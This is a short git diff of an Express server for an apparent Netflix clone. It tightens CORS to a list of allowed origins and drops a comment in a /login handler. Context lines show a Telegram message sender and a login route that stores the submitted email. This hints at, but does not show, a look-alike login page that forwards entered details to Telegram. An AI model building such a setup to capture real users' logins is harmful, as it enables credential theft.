@@ -11,8 +11,29 @@ const app = express();
 process.on('uncaughtException', (err) => console.error('❌ Uncaught Exception:', err));
 process.on('unhandledRejection', (err) => console.error('❌ Unhandled Rejection:', err));
 
-// Middleware
-app.use(cors());
+// ✅ CORS: allow local dev + production host
+const allowedOrigins = [
+  'http://localhost:3000',
+  'http://localhost:5173',
+  'http://127.0.0.1:3000',
+  'http://127.0.0.1:5173',
+  'https://netflix-clone-vue-1.onrender.com',
+];
+
+app.use(
+  cors({
+    origin: function (origin, callback) {
+      if (!origin || allowedOrigins.includes(origin)) {
+        callback(null, true);
+      } else {
+        callback(new Error('CORS not allowed from: ' + origin));
+      }
+    },
+    methods: ['GET', 'POST'],
+    credentials: true,
+  })
+);
+
 app.use(express.json());
 
 // Telegram message sender (multi-chat support)
@@ -66,7 +87,6 @@ app.post('/login', (req, res) => {
           return res.status(500).json({ error: 'Server error' });
         }
 
-        // Store latest email
         app.locals.lastEmail = email;
         return res.status(200).json({ message: 'Login successful' });
       }
